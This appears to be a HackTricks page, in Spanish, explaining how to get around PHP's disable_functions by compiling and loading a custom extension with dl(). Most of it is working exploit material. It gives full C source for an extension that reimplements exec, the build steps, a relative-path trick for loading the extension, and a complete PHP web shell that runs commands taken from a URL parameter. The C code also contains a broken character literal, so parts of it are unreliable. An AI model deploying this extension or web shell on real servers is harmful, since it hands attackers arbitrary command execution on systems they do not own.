<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Nota importante:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** es una función de PHP que se puede utilizar para cargar extensiones de PHP. Si la función no está deshabilitada, podría ser abusada para **burlar `disable_functions` y ejecutar comandos arbitrarios**.\
Sin embargo, tiene algunas limitaciones estrictas:

* La función `dl` debe estar **presente** en el **entorno** y **no deshabilitada**
* La extensión de PHP **debe estar compilada con la misma versión mayor** (versión de la API de PHP) que la que está utilizando el servidor (puedes ver esta información en la salida de phpinfo)
* La extensión de PHP debe estar **ubicada en el directorio** que está **definido** por la directiva **`extension_dir`** (puedes verlo en la salida de phpinfo). Es muy improbable que un atacante que intenta abusar del servidor tenga acceso de escritura sobre este directorio, por lo que este requisito probablemente te impedirá abusar de esta técnica).

**Si cumples con estos requisitos, continúa leyendo esta publicación copiada de** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **para aprender cómo burlar disable\_functions**

Cuando el administrador estaba configurando la caja, pasó por alto la [función dl](http://www.php.net/manual/en/function.dl.php) y no la deshabilitó ya que no había mención de poder ejecutar comandos del sistema.\
La [función dl](http://www.php.net/manual/en/function.dl.php) se utiliza para cargar extensiones de PHP cuando se ejecuta un script.\
\
(Las extensiones de PHP están escritas en C/C++ y se utilizan para dar más funcionalidad a PHP.)\
\
El atacante nota que la función no está deshabilitada y ve potencial y decide crear una extensión de PHP.\
El atacante verifica la versión de PHP utilizando un pequeño script `<?php echo 'La versión de PHP es '.PHP_VERSION; ?>` (PHP\_VERSION es una constante predefinida que contiene el número de versión de PHP.)\
\
El atacante anota la versión y descarga el tarball desde el [sitio web de PHP](http://www.php.net/downloads.php), en este escenario la versión es más antigua que la versión actual, por lo que el atacante tiene que ir al [archivo](http://museum.php.net).\
\
Luego extrae el código fuente y [compila e instala](http://www.php.net/manual/en/install.php) la versión de PHP en su propia caja.\
\
Ahora es el momento de crear la extensión\
El atacante se informa sobre [crear extensiones de PHP](http://www.php.net/manual/en/zend.creating.php) desde el sitio de PHP.\
Después de leer la documentación y crear algunas extensiones por su cuenta, decide mirar el código base de PHP ya que la función que busca ya está creada.\
\
La función que se duplicará será la [función exec](http://www.php.net/manual/en/function.exec.php)\
en el código base se encuentra en ext/standard/exec.c\
\
Las partes relevantes se implementan en una nueva extensión propia.\
\

**Notas:**

Antes de comenzar a compilar los códigos, debes tener en cuenta dos puntos:

1- El valor de `ZEND_MODULE_API_NO` debe cambiarse en el archivo `bypass.c` al actual `Zend Extension Build` en el que estás trabajando, puedes obtenerlo utilizando la línea de comando a continuación:
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- Si te encuentras con errores al compilar el archivo bypass.c en la versión reciente de PHP (5, 7 y 8), puedes cambiar PHP_FUNCTION(bypass_exec) por esto:
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
Los archivos para la extensión separada terminan como se muestra a continuación:

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
```markdown
{% endcode %}

{% code title="php_bypass.h" %}
```
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
```markdown
{% endcode %}

{% code title="config.m4" %}
```
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

Una vez creados los archivos, es hora de compilar la extensión de PHP.
```
phpize
./configure
make
```
Una vez hecho esto, la extensión compilada se ubicará en el subdirectorio de módulos con el nombre de archivo bypass.so.
El archivo se copia en un lugar seguro, ahora se ejecutan los siguientes comandos para limpiar los archivos recién creados.
```
make clean
phpize --clean
```
Ahora el atacante sube la extensión recién creada al host víctima.

(NOTA: Las versiones principales de PHP utilizan diferentes versiones de la API, para que puedas compilar la extensión en un host y subirla a otro, las versiones de la API deben coincidir. Por eso inicialmente se instaló la misma versión de PHP en la máquina del atacante.)

Para cargar una extensión con la función dl, la extensión necesita estar en el directorio de extensiones que está definido por la directiva extension_dir.
Esto puede ser un problema ya que es menos probable que el atacante tenga permisos de escritura en este directorio, sin embargo, hay una manera de sortear esto.
Este problema ha sido discutido por desarrolladores en la página de la función dl dentro de la sección de notas.

El concepto que se discutió es usar una ruta relativa desde el directorio de extensiones definido.
Por ejemplo, si el directorio de extensiones se estableció en /usr/php/extensions y te gustaría cargar bypass.so en el directorio web actual /home/example.com/html, harías lo siguiente:
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
Este método permite evitar la necesidad de tener la extensión en el directorio de extensiones definido.

También hay una manera automatizada para que no tengas que cambiar la ruta relativa para diferentes hosts, este código fue creado por endofyourself \[at] yahoo \[dot] com y mejorado posteriormente por mag\_2000 \[at] front \[dot] ru

Había un pequeño problema con la función, en algunos hosts el directorio de extensiones está establecido en "./" y esta función no tomaba en cuenta si el directorio de extensiones estaba configurado con una ruta relativa, la solución para esto es usar la función realpath.

El script final utilizado para cargar la extensión y ejecutar comandos del sistema para eludir las funciones deshabilitadas es el siguiente:
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
Todo lo que el atacante tiene que hacer ahora para ejecutar comandos es llamar a la URL del script junto con una variable cmd con el comando deseado.
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
